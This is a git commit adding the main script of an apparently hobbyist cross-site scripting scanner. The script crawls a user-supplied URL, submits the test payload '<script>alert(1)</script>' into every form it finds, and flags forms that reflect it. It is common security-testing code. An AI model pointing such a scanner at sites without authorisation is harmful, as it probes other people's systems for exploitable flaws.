ff1dbc13c490c1ebd47ce41bb1c48e9d0e9afac8
Harshit kumar Srivastava <56275347+BitHarsh18@users.noreply.github.com>
2026-05-28 10:22:44 -0400

    Main with some functionality

---
+++ main.py
@@ -0,0 +1,82 @@
+from core.crawler import WebCrawler
+from core.injector import Injector
+from core.detector import XSSDetector
+
+
+crawler = WebCrawler()
+
+injector = Injector()
+
+
+payload = "<script>alert(1)</script>"
+
+
+target_url = input(
+    "ENTER TARGET URL: "
+)
+
+
+links = crawler.get_links(
+    target_url
+)
+
+
+all_urls = [target_url] + links
+
+
+print(
+    f"\n[+] Found {len(links)} links\n"
+)
+
+
+for link in links:
+
+    print(f"[LINK] {link}")
+
+
+for current_url in all_urls:
+
+    print(
+        f"\n[SCANNING] {current_url}"
+    )
+
+    forms = crawler.get_forms(
+        current_url
+    )
+
+    print(
+        f"[+] Found {len(forms)} forms"
+    )
+
+    for form in forms:
+
+        form_details = crawler.get_form_details(
+            form
+        )
+
+        response = injector.submit_form(
+            form_details,
+            current_url,
+            payload
+        )
+
+        is_vulnerable = XSSDetector.is_vulnerable(
+            response,
+            payload
+        )
+
+        if is_vulnerable:
+
+            print("[VULNERABLE]")
+
+            print(
+                f"Payload : {payload}"
+            )
+
+            print(
+                f"Method : {form_details['method']}"
+            )
+
+            print(
+                f"Inputs : {form_details['inputs']}\n"
+            )
